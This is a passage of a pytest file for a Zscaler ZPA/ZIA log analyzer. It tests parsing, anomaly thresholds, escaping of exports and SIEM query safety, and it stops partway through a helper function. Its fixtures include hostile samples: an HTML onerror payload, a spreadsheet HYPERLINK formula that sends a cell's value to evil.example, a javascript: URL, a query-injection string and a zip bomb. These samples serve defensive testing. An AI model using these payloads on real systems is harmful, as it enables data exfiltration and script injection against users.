"""Traffic and session logs (traffic_logs.py, siem_queries.py, the
/api/traffic-logs routes and static/report_traffic_logs.html).

Every fixture here is synthetic, written by the helpers below in the
documented ZPA LSS and ZIA NSS shapes: made-up users at example.com, made-up
hosts, documentation IP ranges. No tenant and no network are touched.
"""
from __future__ import annotations

import base64
import gzip
import io
import json
import os
import re
import stat
import time
import zipfile
from datetime import datetime, timedelta, timezone

import pytest
from fastapi.testclient import TestClient

import siem_queries
import traffic_logs as tl

T0 = datetime(2026, 10, 27, 8, 0, 0, tzinfo=timezone.utc)
HOSTILE = '<img src=x onerror="window.__pwned=1">=HYPERLINK("http://evil.example/?"&A1)'


def ctime(t: datetime) -> str:
    return t.strftime("%a %b %d %H:%M:%S %Y")


def iso(t: datetime) -> str:
    return t.strftime("%Y-%m-%dT%H:%M:%S.000Z")


def activity(cid, user, t, reason="BRK_MT_CLOSED_FROM_CLIENT", host="intranet.example.com", app="Intranet", conn="ac-east-1",
             status="close", port=443, edge="broker2.sjc1", policy="Staff to intranet"):
    """One ZPA LSS User Activity record (zpn_trans_log JSON)."""
    return {"LogTimestamp": ctime(t), "Customer": "Example Co", "SessionID": f"sess-{cid}", "ConnectionID": cid,
            "InternalReason": reason, "ConnectionStatus": status, "IPProtocol": 6, "DoubleEncryption": 0, "Username": user,
            "ServicePort": port, "ClientPublicIP": "203.0.113.10", "ClientPrivateIP": "10.0.0.5", "ClientCountryCode": "US",
            "ClientZEN": edge, "Policy": policy, "Connector": conn, "ConnectorZEN": edge, "ConnectorIP": "10.1.0.4",
            "Host": host, "Application": app, "AppGroup": "Corp", "Server": "0", "ServerIP": "10.2.0.9", "ServerPort": port,
            "TimestampConnectionStart": iso(t), "TimestampConnectionEnd": iso(t + timedelta(seconds=30))}


def status(sid, user, t, st="ZPN_STATUS_AUTHENTICATED", auth=None, unauth=None, ctype="zpn_client_type_zapp", **kw):
    """One ZPA LSS User Status record (zpn_auth_log JSON)."""
    d = {"LogTimestamp": ctime(t), "Customer": "Example Co", "Username": user, "SessionID": sid, "SessionStatus": st,
         "Version": kw.get("version", "4.4.0.300"), "ZEN": "broker2.sjc1", "PrivateIP": "10.0.0.5", "PublicIP": kw.get("ip", "203.0.113.10"),
         "CountryCode": "US", "City": "San Jose", "TimestampAuthentication": iso(auth or t), "TimestampUnAuthentication": iso(unauth) if unauth else "",
         "TotalBytesRx": kw.get("rx", 1000), "TotalBytesTx": kw.get("tx", 500), "Idp": "Example IdP", "Hostname": kw.get("device", "LAPTOP-1"),
         "Platform": kw.get("platform", "windows"), "ClientType": ctype, "TrustedNetworksNames": kw.get("trusted", ""),
         "PosturesHit": "", "PosturesMiss": kw.get("miss", "")}
    return d


def connector(name, t, st="ZPN_STATUS_AUTHENTICATED", group="East", version="24.1.2", cpu=10, mem=20):
    """One ZPA LSS App Connector Status record (zpn_ast_auth_log JSON)."""
    return {"LogTimestamp": ctime(t), "Customer": "Example Co", "SessionID": f"ast-{name}", "SessionType": "ZPN_ASSISTANT_BROKER_CONTROL",
            "SessionStatus": st, "Version": version, "Platform": "el9", "ZEN": "broker2.sjc1", "Connector": name, "ConnectorGroup": group,
            "PrivateIP": "10.1.0.4", "PublicIP": "198.51.100.4", "CPUUtilization": cpu, "MemUtilization": mem}


def pse(name, t, st="ZPN_STATUS_AUTHENTICATED"):
    """One ZPA LSS Private Service Edge Status record (zpn_sys_auth_log JSON)."""
    return {"LogTimestamp": ctime(t), "Customer": "Example Co", "SessionID": f"pse-{name}", "SessionType": "ZPN_PBROKER_BROKER_CONTROL",
            "SessionStatus": st, "PackageVersion": "24.3.1", "Platform": "el9", "ZEN": "broker2.sjc1", "ServiceEdge": name,
            "ServiceEdgeGroup": "HQ", "PrivateIP": "10.9.0.2", "CPUUtilization": 5, "MemUtilization": 30}


def web(t, user="ann@example.com", url="www.example.org/index", action="Allowed", cat="General Surfing", **kw):
    """One ZIA NSS web record, NSS field names as JSON keys."""
    d = {"time": ctime(t), "login": user, "proto": kw.get("proto", "HTTPS"), "url": url, "action": action, "urlcat": cat,
         "urlsupercat": "Business", "urlclass": "Business Use", "appname": kw.get("app", "None"), "appclass": "None",
         "reqsize": 400, "respsize": 9000, "threatname": kw.get("threat", "None"), "malwarecat": kw.get("malware", "None"),
         "riskscore": 0, "dlpeng": kw.get("dlpeng", "None"), "dlpdict": kw.get("dlpdict", "None"), "location": "HQ", "dept": "Sales",
         "cip": "10.0.0.5", "sip": "192.0.2.10", "reqmethod": "GET", "respcode": "200", "ruletype": kw.get("ruletype", "None"),
         "rulelabel": kw.get("rule", "None"), "urlfilterrulelabel": kw.get("urlrule", "None"), "apprulelabel": kw.get("apprule", "None"),
         "ssldecrypted": kw.get("ssl", "Yes"), "externalspr": kw.get("spr", "Inspected")}
    return d


def lines(*recs) -> str:
    return "\n".join(r if isinstance(r, str) else json.dumps(r) for r in recs) + "\n"


def upload(text_or_bytes, name="logs.json"):
    data = text_or_bytes.encode() if isinstance(text_or_bytes, str) else text_or_bytes
    return [{"name": name, "content": base64.b64encode(data).decode(), "encoding": "base64"}]


def run(text_or_bytes, name="logs.json", fmt=""):
    return tl.analyze(upload(text_or_bytes, name), fmt)


@pytest.fixture
def client(monkeypatch, tmp_path):
    import dlp_api_server as srv
    monkeypatch.setenv("DLP_CHECK_TRAFFIC_LOG_REPORTS", str(tmp_path / "saved"))
    return TestClient(srv.app)


# ── Parsers, one per format ──────────────────────────────────────────
def test_zpa_user_activity_json_lines_are_read_and_failures_counted_once_per_connection():
    """ASVS V5.1.3 · CWE-20 · WSTG-INPV-01: ZPA LSS User Activity JSON: connections by ConnectionID, a failure counted once even when its open and close records both carry it."""
    recs = [activity(f"c{i}", "ann@example.com", T0 + timedelta(minutes=i)) for i in range(8)]
    recs += [activity("f1", "bob@example.com", T0, reason="BRK_MT_SETUP_FAIL_REJECTED_BY_POLICY", status="open"),
             activity("f1", "bob@example.com", T0 + timedelta(seconds=1), reason="BRK_MT_SETUP_FAIL_REJECTED_BY_POLICY", status="close"),
             activity("f2", "bob@example.com", T0, reason="AST_MT_SETUP_ERR_OPEN_SERVER_TIMEOUT", conn="ac-west-2")]
    rep = run(lines(*recs))
    act = rep["zpa"]["activity"]
    assert rep["log_types"][0]["kind"] == "zpa_activity" and rep["input"]["records"] == 11
    assert act["connections"] == 10 and act["failed_connections"] == 2
    codes = {r["code"]: r for r in act["reasons"]}
    assert codes["BRK_MT_SETUP_FAIL_REJECTED_BY_POLICY"]["count"] == 1
    assert codes["BRK_MT_SETUP_FAIL_REJECTED_BY_POLICY"]["family"] == "policy"
    assert codes["AST_MT_SETUP_ERR_OPEN_SERVER_TIMEOUT"]["family"] == "server"
    assert {c["name"]: c["failures"] for c in act["connectors"]}["ac-west-2"] == 1
    assert act["destinations"][0] == {"name": "intranet.example.com", "count": 10, "failures": 2, "port": "443", "proto": "tcp", "link": True}


def test_zpa_user_status_sessions_drop_sign_in_checks_and_merge_rotated_session_ids():
    """ASVS V5.1.3 · CWE-20 · WSTG-INPV-01: ZPA LSS User Status: a session under 5 s is a sign-in check, consecutive IDs of one user 60 s apart or less are one session, a longer gap is a new one."""
    u = "ann@example.com"
    recs = [
        status("p1", u, T0, auth=T0), status("p1", u, T0 + timedelta(seconds=1), "ZPN_STATUS_DISCONNECTED", auth=T0, unauth=T0 + timedelta(seconds=1)),
        status("s1", u, T0 + timedelta(minutes=1), auth=T0 + timedelta(minutes=1)),
        status("s1", u, T0 + timedelta(minutes=31), "ZPN_STATUS_DISCONNECTED", auth=T0 + timedelta(minutes=1), unauth=T0 + timedelta(minutes=31)),
        # rotated ID: starts 20 s after s1 ended, from another public address
        status("s2", u, T0 + timedelta(minutes=31, seconds=20), auth=T0 + timedelta(minutes=31, seconds=20), ip="198.51.100.77"),
        status("s2", u, T0 + timedelta(minutes=61), "ZPN_STATUS_DISCONNECTED", auth=T0 + timedelta(minutes=31, seconds=20), unauth=T0 + timedelta(minutes=61), ip="198.51.100.77"),
        # a new session two hours later
        status("s3", u, T0 + timedelta(hours=3), auth=T0 + timedelta(hours=3)),
        status("x1", "bob@example.com", T0, "ZPN_STATUS_AUTH_FAILED"),
        status("m1", "", T0, ctype="zpn_client_type_machine_tunnel"),
    ]
    st = run(lines(*recs))["zpa"]["status"]
    assert st["probes_dropped"] == 1 and st["auth_failures"] == 1
    mine = [r for r in st["rows"] if r["user"] == u]
    assert len(mine) == 2, mine
    merged = [r for r in mine if r["session_ids"] == 2][0]
    assert merged["duration_s"] == 60 * 60 and merged["public_ip"] == "198.51.100.77" and merged["other_public_ips"] == ["203.0.113.10"]
    assert [r for r in mine if r["session_ids"] == 1][0]["end"] == ""   # s3 still open
    assert {c["name"] for c in st["client_types"]} >= {"Client Connector", "Machine tunnel"}


def test_app_connector_and_private_service_edge_status_give_health():
    """ASVS V11.1.4 · CWE-754 · WSTG-BUSL-01: App Connector Status: down at the end, flapping, failed sign-ins, CPU and mixed versions are named; Private Service Edge Status is read too."""
    recs = [connector("ac-1", T0), connector("ac-1", T0 + timedelta(minutes=5), "ZPN_STATUS_DISCONNECTED")]
    for i in range(3):
        recs += [connector("ac-2", T0 + timedelta(minutes=10 * i), "ZPN_STATUS_DISCONNECTED", version="24.1.1", cpu=91),
                 connector("ac-2", T0 + timedelta(minutes=10 * i + 1))]
    recs += [connector("ac-3", T0, "ZPN_STATUS_AUTH_FAILED"), pse("pse-1", T0), pse("pse-1", T0 + timedelta(minutes=1), "ZPN_STATUS_DISCONNECTED")]
    h = run(lines(*recs))["health"]
    rows = {r["name"]: r for r in h["connectors"]["rows"]}
    assert rows["ac-1"]["state"] == "down" and rows["ac-2"]["state"] == "up" and rows["ac-3"]["state"] == "failing"
    notes = " ".join(rows["ac-2"]["notes"])
    assert "disconnected 3 times" in notes and "CPU reached 91%" in notes and "more than one version" in notes
    assert h["service_edges"]["rows"][0]["state"] == "down" and h["connectors"]["down"] == 2


def test_zia_web_json_with_nss_names_and_the_cloud_nss_http_shape_read_the_same():
    """ASVS V5.1.3 · CWE-20 · WSTG-INPV-01: ZIA web logs as JSON with NSS names, and as {"sourcetype": "zscalernss-web", "event": {...}} with the SIEM key names, give the same counts."""
    a = web(T0, action="Blocked", cat="Gambling", rule="Block gambling", ruletype="URL Filtering", urlrule="Block gambling", ssl="No", spr="Not inspected because of SSL policy")
    hec = {"sourcetype": "zscalernss-web", "event": {"datetime": ctime(T0), "user": "ann@example.com", "url": "www.example.org/index",
                                                     "action": "Blocked", "urlcategory": "Gambling", "rulelabel": "Block gambling",
                                                     "decrypted": "No", "dlpengine": "None", "threatname": "None", "hostname": "www.example.org"}}
    r1, r2 = run(lines(a))["zia"]["zia_web"], run(lines(hec))["zia"]["zia_web"]
    for r in (r1, r2):
        assert r["actions"] == {"blocked": 1}
        assert r["categories"][0]["name"] == "Gambling" and r["categories"][0]["blocked"] == 1
        assert r["destinations"][0]["name"] == "www.example.org"
        assert r["ssl"]["not_inspected"] == 1
    assert r1["rules"] == [{"module": "URL filtering", "rule": "Block gambling", "action": "blocked", "count": 1}]   # named twice, counted once
    assert r1["ssl"]["reasons"][0]["name"] == "Not inspected because of SSL policy"


def test_zia_web_csv_with_insights_column_names():
    """ASVS V5.1.3 · CWE-20 · WSTG-INPV-01: a web log CSV whose header uses the Insights column names (Logged Time, User, URL, Policy Action, URL Category) is read by its header."""
    csv_text = ('Logged Time,User,URL,Policy Action,URL Category,SSL Inspected\n'
                f'"{ctime(T0)}",ann@example.com,www.example.org/a,Allowed,Business,Yes\n'
                f'"{ctime(T0)}",bob@example.com,"bad.example.net/x,y",Blocked,Gambling,No\n'
                'only,three,columns\n')
    r = run(csv_text, "insights.csv")
    w = r["zia"]["zia_web"]
    assert w["actions"] == {"allowed": 1, "blocked": 1}
    assert {d["name"] for d in w["destinations"]} == {"www.example.org", "bad.example.net"}
    assert r["input"]["malformed"] == 1 and "columns" in r["input"]["malformed_examples"][0]["why"]


def test_zia_default_tab_separated_feeds_web_firewall_and_dns():
    """ASVS V5.1.3 · CWE-20 · WSTG-INPV-01: headerless tab-separated lines in the default web, firewall and DNS order are read only when their values fit (time, action, addresses)."""
    w = "\t".join([ctime(T0), "ann@example.com", "HTTPS", "www.example.org/a", "Blocked", "None", "None", "300", "0", "Business Use",
                   "Business", "Gambling", "None", "None", "0", "None", "None", "HQ", "Sales", "10.0.0.5", "0.0.0.0", "CONNECT", "403",
                   "Mozilla/5.0", "URL Filtering", "Block gambling"])
    f = "\t".join([ctime(T0), "ann@example.com", "10.0.0.5", "50000", "192.0.2.80", "22", "ssh.example.net", "198.51.100.1", "Block/Drop",
                   "Block SSH", "TCP", "SSH", "ssh", "HQ", "Sales", "0", "60", "1"])
    d = "\t".join([ctime(T0), "ann@example.com", "Sales", "HQ", "REQ_BLOCK", "Block DoH", "", "", "evil.example.com", "A", "", "", "10.0.0.5", "192.0.2.53", "4", "Malware"])
    rep = run(lines(w, f, d, "\t".join(["x"] * 20)), "feed.log")
    z = rep["zia"]
    assert z["zia_web"]["rules"][0]["rule"] == "Block gambling" and z["zia_web"]["actions"] == {"blocked": 1}
    assert z["zia_fw"]["destinations"][0] == {"name": "ssh.example.net", "count": 1, "blocked": 1, "port": "22", "proto": "tcp", "link": True}
    assert z["zia_fw"]["rules"][0] == {"module": "Cloud Firewall", "rule": "Block SSH", "action": "blocked", "count": 1}
    assert z["zia_dns"]["destinations"][0]["name"] == "evil.example.com" and z["zia_dns"]["actions"] == {"blocked": 1}
    assert rep["input"]["malformed"] == 1


def test_a_pasted_feed_output_format_reads_a_custom_feed():
    """ASVS V5.1.3 · CWE-20 · WSTG-INPV-01: a custom NSS feed is split by its own pasted output format, literal text included."""
    fmt = 'zscaler-nss: user=%s{login}|url=%s{url}|act=%s{action}|cat=%s{urlcat}|when=%s{time}\\n'
    line = f"zscaler-nss: user=ann@example.com|url=www.example.org/a|act=Blocked|cat=Gambling|when={ctime(T0)}"
    rep = run(lines(line, "zscaler-nss: something else"), "custom.log", fmt)
    w = rep["zia"]["zia_web"]
    assert w["actions"] == {"blocked": 1} and w["categories"][0]["name"] == "Gambling"
    assert rep["input"]["template"] == {"kind": "zia_web", "fields": 5} and rep["input"]["malformed"] == 1


def test_packed_and_wrapped_inputs_gzip_zip_syslog_prefix_and_json_array():
    """ASVS V5.1.3 · CWE-20 · WSTG-INPV-03: .gz and .zip uploads are unpacked under the archive caps; a syslog prefix before the JSON and a JSON-array feed are read."""
    body = lines(activity("c1", "ann@example.com", T0))
    gz = gzip.compress(body.encode())
    zb = io.BytesIO()
    with zipfile.ZipFile(zb, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("a/user_activity.json", body)
    assert run(gz, "ua.json.gz")["zpa"]["activity"]["connections"] == 1
    assert run(zb.getvalue(), "bundle.zip")["zpa"]["activity"]["connections"] == 1
    syslog = "<134>Oct 27 08:00:00 lss-host zpa-lss: " + json.dumps(activity("c2", "ann@example.com", T0))
    assert run(syslog + "\n")["zpa"]["activity"]["connections"] == 1
    arr = "[" + json.dumps(web(T0)) + ",\n" + json.dumps(web(T0, action="Blocked")) + "]\n"
    assert run(arr)["zia"]["zia_web"]["actions"] == {"allowed": 1, "blocked": 1}


# ── Malformed and oversized input ────────────────────────────────────
def test_malformed_lines_are_counted_never_fatal():
    """ASVS V5.1.4 · CWE-20 · WSTG-INPV-01: broken JSON, deep nesting, binary noise and a JSON object of another kind are counted and skipped; the good records are still read."""
    deep = "{" + '"a":' * 50 + "[" * 3000 + "]" * 3000 + "}" * 0
    bad = ["{not json}", deep[:60000], '{"hello": "world"}', "\x00\x01garbage", '{"a": NaN, "ConnectionID": "z"}']
    rep = run(lines(*bad, activity("c1", "ann@example.com", T0), *["x"] * 20))
    inp = rep["input"]
    assert rep["zpa"]["activity"]["connections"] == 1
    assert inp["unrecognised"] == 1 and inp["malformed"] >= 23
    assert len(inp["malformed_examples"]) == 10 and all(set(e) == {"file", "line", "why"} for e in inp["malformed_examples"])


def test_an_oversized_line_is_skipped_without_being_read_and_the_next_line_is_read():
    """ASVS V5.1.4 · CWE-400 · WSTG-INPV-01: a line longer than the line cap is counted as oversized and skipped; the record after it is read."""
    huge = '{"ConnectionID": "big", "Host": "' + "a" * (tl.MAX_LINE_BYTES * 3) + '"}'
    rep = run(lines(huge, activity("c1", "ann@example.com", T0)))
    assert rep["input"]["oversized"] == 1 and rep["zpa"]["activity"]["connections"] == 1


def test_reading_stops_at_the_line_cap_and_says_so(monkeypatch):
    """ASVS V5.1.4 · CWE-400 · WSTG-BUSL-05: past MAX_LINES the rest is not read, and the report says it stopped."""
    monkeypatch.setattr(tl, "MAX_LINES", 5)
    rep = run(lines(*[activity(f"c{i}", "ann@example.com", T0) for i in range(20)]))
    assert rep["input"]["capped"] is True and rep["input"]["lines"] == 5 and rep["zpa"]["activity"]["connections"] == 5
    assert any("stopped after" in n for n in rep["input"]["notes"])


def test_counters_stop_taking_new_values_at_their_cap(monkeypatch):
    """ASVS V5.1.4 · CWE-770 · WSTG-BUSL-05: a log of many distinct destinations costs bounded memory: past the cap new values count under one row."""
    monkeypatch.setattr(tl, "MAX_DISTINCT", 3)
    c = tl.BoundedCounter(3)
    for h in ["a", "b", "c", "d", "e", "a"]:
        c.add(h)
    assert len(c) == 4 and c.c[tl.OTHER] == 2 and c.c["a"] == 2


def test_nothing_readable_is_a_plain_400(client):
    """ASVS V5.1.3 · CWE-20 · WSTG-INPV-01: an upload with no log records is refused with a plain reason, not a server error."""
    r = client.post("/api/traffic-logs/analyze", json={"files": upload("just text\nmore text\n", "notes.txt")})
    assert r.status_code == 400 and "No ZPA or ZIA log records" in r.json()["detail"]
    assert client.post("/api/traffic-logs/analyze", json={"files": []}).status_code == 400


@pytest.mark.parametrize("fmt,why", [("x" * 5000, "longer than"), ("no tokens here", "no %s{field}"),
                                     ("%s{login}%s{url}", "nothing between"), ("%s{foo}\t%s{bar}", "names no web")])
def test_a_bad_feed_format_is_refused(fmt, why):
    """ASVS V5.1.3 · CWE-20 · WSTG-INPV-01: a pasted feed format that is too long, has no fields, cannot be split or names no known field is refused with the reason."""
    with pytest.raises(ValueError, match=re.escape(why)):
        tl.FeedTemplate(fmt)


def test_a_hostile_line_against_a_pasted_format_takes_linear_time():
    """ASVS V5.1.5 · CWE-1333 · WSTG-INPV-13: each field of a pasted format stops at the next separator, so a long line of separators cannot make the matcher backtrack."""
    t = tl.FeedTemplate("\t".join(f"%s{{{f}}}" for f in ["time", "login", "url", "action", "urlcat"] * 8))
    start = time.monotonic()
    for line in ("\t" * 60000, "a\t" * 30000, "\t".join(["x" * 2000] * 39) + "\tz\tq"):
        t.read(line)
    assert time.monotonic() - start < 2.0


def test_a_zip_bomb_member_is_not_inflated_past_the_cap(monkeypatch):
    """ASVS V12.1.1 · CWE-409 · WSTG-BUSL-09: a .gz that expands past the member cap is skipped with a note (the Log analyzer's bounded unpacking)."""
    import log_analyzer
    monkeypatch.setattr(log_analyzer, "MAX_MEMBER_BYTES", 1024 * 1024)
    bomb = gzip.compress(b"\n" * (5 * 1024 * 1024))
    ok = lines(activity("c1", "ann@example.com", T0))
    rep = tl.analyze(upload(bomb, "bomb.json.gz") + upload(ok, "ok.json"))
    assert any("bomb.json" in n for n in rep["input"]["notes"]) and rep["zpa"]["activity"]["connections"] == 1


# ── Analysis oracles ─────────────────────────────────────────────────
@pytest.mark.parametrize("code,failure,family", [
    ("OPEN_OR_ACTIVE_CONNECTION", False, "normal"), ("BRK_MT_CLOSED_FROM_CLIENT", False, "normal"),
    ("BRK_MT_TERMINATED_IDLE_TIMEOUT", False, "normal"), ("", False, None),
    ("BRK_MT_SETUP_FAIL_REJECTED_BY_POLICY", True, "policy"), ("BRK_MT_SETUP_FAIL_APP_NOT_FOUND", True, "no_segment"),
    ("BRK_MT_SETUP_TIMEOUT", True, "timeout"), ("BRK_MT_AUTH_SAML_DECODE_FAIL", True, "auth"),
    ("AST_MT_SETUP_ERR_HASH_TBL_FULL", True, "capacity"), ("AST_MT_SETUP_ERR_SOMETHING_NEW_WITH_DNS", True, "dns"),
    ("ZPN_ERR_ENTIRELY_UNKNOWN", True, "other"), ("CLT_SOMETHING", True, "client"),
])
def test_internal_reasons_are_classified_and_explained(code, failure, family):
    """ASVS V11.1.4 · CWE-754 · WSTG-BUSL-01: table of ZPA internal reasons: normal ends are not failures; a known code gets its own words, an unknown one the family its words name, never a guess."""
    assert tl.is_failure(code) is failure
    if family:
        x = tl.explain_reason(code)
        assert x["family"] == family and x["what"] and x["do"]


def test_spike_detection_flags_only_slots_at_three_times_the_median_and_ten():
    """ASVS V11.1.4 · CWE-682 · WSTG-BUSL-01: hourly failures 2,3,2,3,2 then 12 and 9: the 12 is a spike (>= 3 x median 2.5 and >= 10), the 9 is not (under 10)."""
    recs, n = [], 0
    for hour, count in enumerate([2, 3, 2, 3, 2, 12, 2, 9]):
        for _ in range(count):
            n += 1
            recs.append(activity(f"f{n}", f"u{n % 7}@example.com", T0 + timedelta(hours=hour, minutes=1), reason="BRK_MT_SETUP_TIMEOUT"))
    rep = run(lines(*recs))
    sp = [a for a in rep["anomalies"] if a["kind"] == "spike" and a["series"] == "failures"]
    assert [a["at"] for a in sp] == [(T0 + timedelta(hours=5)).isoformat().replace("+00:00", "Z")]
    assert sp[0]["count"] == 12 and sp[0]["median"] == 2.5
    assert rep["zpa"]["timeline"]["bucket_seconds"] in (300, 900, 3600)


@pytest.mark.parametrize("fails,total,named", [(9, 9, False), (10, 20, True), (10, 26, False), (25, 200, True)])
def test_many_failures_for_one_user_thresholds(fails, total, named):
    """ASVS V11.1.4 · CWE-682 · WSTG-BUSL-01: a user is named at 10 failures that are at least half their connections, or at 25 whatever the share."""
    recs = [activity(f"f{i}", "cat@example.com", T0 + timedelta(seconds=i), reason="BRK_MT_SETUP_FAIL_REJECTED_BY_POLICY") for i in range(fails)]
    recs += [activity(f"o{i}", "cat@example.com", T0 + timedelta(seconds=i)) for i in range(total - fails)]
    rep = run(lines(*recs))
    users = [u["name"] for u in rep["zpa"]["activity"]["users_many_failures"]]
    assert (users == ["cat@example.com"]) is named
    assert any(a["kind"] == "user_failures" for a in rep["anomalies"]) is named


def test_new_destinations_are_first_seen_in_the_last_day_and_need_two_hours_of_logs():
    """ASVS V11.1.4 · CWE-682 · WSTG-BUSL-01: over three days, a host first seen on the last day is new and one seen every day is not; under two hours nothing is called new."""
    recs = [activity(f"o{d}", "ann@example.com", T0 + timedelta(days=d), host="old.example.com") for d in range(3)]
    recs.append(activity("n1", "ann@example.com", T0 + timedelta(days=2, hours=1), host="new.example.com"))
    nd = run(lines(*recs))["zpa"]["activity"]["new_destinations"]
    assert nd["computed"] and [x["name"] for x in nd["items"]] == ["new.example.com"]
    short = run(lines(activity("a", "ann@example.com", T0), activity("b", "ann@example.com", T0 + timedelta(minutes=30), host="x.example.com")))
    assert short["zpa"]["activity"]["new_destinations"]["computed"] is False


def test_zia_blocked_allowed_dlp_threats_and_ssl_are_counted_exactly():
    """ASVS V11.1.4 · CWE-682 · WSTG-BUSL-01: oracle over a small web log: actions, DLP events (engine or dictionary), threat events (a benign sandbox verdict is not one), SSL inspected against not, rules per module."""
    recs = [web(T0, action="Allowed"), web(T0, action="Allowed", ssl="No", spr="Not inspected because of O365 bypass", url="outlook.office.example/x"),
            web(T0, action="Blocked", dlpeng="PCI", dlpdict="Credit Cards|SSN", rule="DLP block cards", ruletype="Data Loss Prevention"),
            web(T0, action="Blocked", threat="EICAR Test File", malware="Virus", rule="Malware", ruletype="Malware Protection"),
            web(T0, action="Allowed", malware="Sandbox Benign"), web(T0, action="Caution", urlrule="Caution social", cat="Social Networking"),
            web(T0, action="Allowed", proto="HTTP", ssl="")]
    w = run(lines(*recs))["zia"]["zia_web"]
    assert w["actions"] == {"allowed": 4, "blocked": 2, "cautioned": 1}
    assert w["dlp"]["events"] == 1 and {e["name"] for e in w["dlp"]["dictionaries"]} == {"Credit Cards", "SSN"}
    assert w["threats"]["events"] == 1 and w["threats"]["names"][0]["name"] == "EICAR Test File"
    assert (w["ssl"]["inspected"], w["ssl"]["not_inspected"], w["ssl"]["plain_http"]) == (5, 1, 1)
    rules = {(r["module"], r["rule"], r["action"]) for r in w["rules"]}
    assert rules == {("Data Loss Prevention", "DLP block cards", "blocked"), ("Malware Protection", "Malware", "blocked"),
                     ("URL filtering", "Caution social", "cautioned")}


@pytest.mark.parametrize("text,expect", [
    ("Mon Oct 27 08:00:00 2026", T0), ("Tue Oct  7 08:00:00 2025", datetime(2025, 10, 7, 8, 0, tzinfo=timezone.utc)),
    ("2026-10-27T08:00:00.000Z", T0), ("2026-10-27 09:00:00+01:00", T0), ("1793088000", datetime.fromtimestamp(1793088000, tz=timezone.utc)),
    ("1793088000000000", datetime.fromtimestamp(1793088000, tz=timezone.utc)), ("10/27/2026 08:00:00 AM", T0),
    ("0", None), ("", None), ("not a time", None), ("1899-01-01T00:00:00Z", None), ("99999999999999999999", None),
])
def test_log_times_in_every_documented_form(text, expect):
    """ASVS V5.1.3 · CWE-20 · WSTG-INPV-01: table of the timestamp forms LSS and NSS write; anything else, or out of range, is no time."""
    assert tl.parse_time(text) == expect


@pytest.mark.parametrize("dest,ok", [("intranet.example.com", True), ("192.0.2.1", True), ("2001:db8::1", True), ("*.example.com", True),
                                     ("javascript:alert(1)", False), ("a b.example.com", False), ("<x>.example.com", False), ("localhost", False)])
def test_only_a_host_or_address_links_to_the_path_analyzer(dest, ok):
    """ASVS V5.1.3 · CWE-601 · WSTG-CLNT-04: a destination becomes a Path analyzer link only when it is a host name or an IP address."""
    assert tl.linkable(dest) is ok


# ── Escaping on every output ─────────────────────────────────────────
def _hostile_report(client):
    recs = [activity("h1", HOSTILE, T0, host="evil.example.com", app=HOSTILE, reason="BRK_MT_SETUP_FAIL_REJECTED_BY_POLICY", conn=HOSTILE),
            web(T0, user=HOSTILE, cat=HOSTILE, action="Blocked", rule=HOSTILE), web(T0, cat='=HYPERLINK("http://evil.example/","x")')]
    r = client.post("/api/traffic-logs/analyze", json={"files": upload(lines(*recs))})
    assert r.status_code == 200, r.text
    return r.json()


def test_hostile_values_come_back_as_data_and_csv_neutralises_formulas(client):
    """ASVS V5.3.3 · CWE-1236 · WSTG-INPV-02: a log value carrying HTML and a spreadsheet formula is returned as plain JSON data, and the CSV export starts no cell with a formula."""
    rep = _hostile_report(client)
    assert rep["zpa"]["activity"]["apps"][0]["name"] == HOSTILE   # data, unchanged; the page escapes it
    csv_text = client.get(f"/api/traffic-logs/report/{rep['report_id']}/export?format=csv&names=1").text
    cells = [c for row in csv_text.splitlines() for c in row.split(",")]
    assert not any(c.lstrip('"').startswith(("=", "+", "@")) for c in cells)
    assert "'=HYPERLINK" in csv_text


def test_hostile_values_stay_text_in_excel_and_pdf(client):
    """ASVS V5.3.3 · CWE-1236 · WSTG-INPV-02: the Excel export writes a hostile value as an inline string (XML-escaped, never a formula) and the PDF export builds."""
    rep = _hostile_report(client)
    x = client.get(f"/api/traffic-logs/report/{rep['report_id']}/export?format=xlsx&names=1")
    assert x.status_code == 200
    with zipfile.ZipFile(io.BytesIO(x.content)) as z:
        xml = "".join(z.read(n).decode() for n in z.namelist() if n.startswith("xl/worksheets/"))
    assert "<f>" not in xml and "&lt;img src=x" in xml and "<img" not in xml
    p = client.get(f"/api/traffic-logs/report/{rep['report_id']}/export?format=pdf&names=1")
    assert p.status_code == 200 and p.content.startswith(b"%PDF")
    assert client.get(f"/api/traffic-logs/report/{rep['report_id']}/export?format=html").status_code == 400


def test_the_page_script_never_writes_html():
    """ASVS V5.3.3 · CWE-79 · WSTG-CLNT-03: the page's script builds every node with createElement and textContent: no innerHTML, outerHTML, insertAdjacentHTML or document.write."""
    js = open(os.path.join(os.path.dirname(tl.__file__), "static", "traffic_logs.js"), encoding="utf-8").read()
    for sink in ("innerHTML", "outerHTML", "insertAdjacentHTML", "document.write", "eval(", "new Function"):
        assert sink not in js, sink
    assert "setAttribute('style'" not in js and 'setAttribute("style"' not in js


@pytest.mark.parametrize("siem", sorted(siem_queries.SIEMS))
def test_siem_values_cannot_break_out_of_their_string(siem):
    """ASVS V5.3.4 · CWE-943 · WSTG-INPV-05: a user or destination put into a query is one escaped string literal: its quote, backslash and line breaks cannot end it."""
    evil = 'x" OR 1==1 | delete\\\n| drop'
    q = siem_queries.render(siem, "zpa_failure_reasons", 24, user=evil)["query"]
    lit = re.search(r'Username\s*==?\s*("(?:[^"\\]|\\.)*")', q).group(1)
    assert lit == '"x\\" OR 1==1 | delete\\\\| drop"'
    assert "\n| drop" not in q


def test_siem_templates_cover_every_question_in_three_languages_with_no_placeholder_left():
    """ASVS V1.14.1 · CWE-1059 · WSTG-CONF-01: every question renders in Splunk, Sentinel and Elastic with its hours and source, and no {placeholder} is left."""
    for siem in siem_queries.SIEMS:
        out = siem_queries.render_all(siem, 48, user="ann@example.com", destination="intranet.example.com")
        assert len(out) == len(siem_queries.QUESTIONS) >= 25
        for q in out:
            assert not re.search(r"\{[a-z_]+\}", q["query"]), q
            assert "48" in q["query"]
    fams = {q["family"] for q in siem_queries.QUESTIONS}
    assert fams == {"zpa", "zia_web", "zia_fw", "zia_dns"}


@pytest.mark.parametrize("params", [{"siem": "oracle"}, {"hours": "0"}, {"hours": "99999"}, {"src_web": "idx | delete"},
                                    {"siem": "sentinel", "src_web": "Table;drop"}, {"question": "nope"}])
def test_siem_route_refuses_bad_input(client, params):
    """ASVS V5.1.3 · CWE-20 · WSTG-INPV-01: an unknown SIEM or question, hours out of range and an index or table name with query syntax are a 400."""
    assert client.get("/api/traffic-logs/siem", params=params).status_code == 400


# ── Nothing kept unless saved ────────────────────────────────────────
def _files_under(folder):
    out = []
    for root, _dirs, files in os.walk(folder):
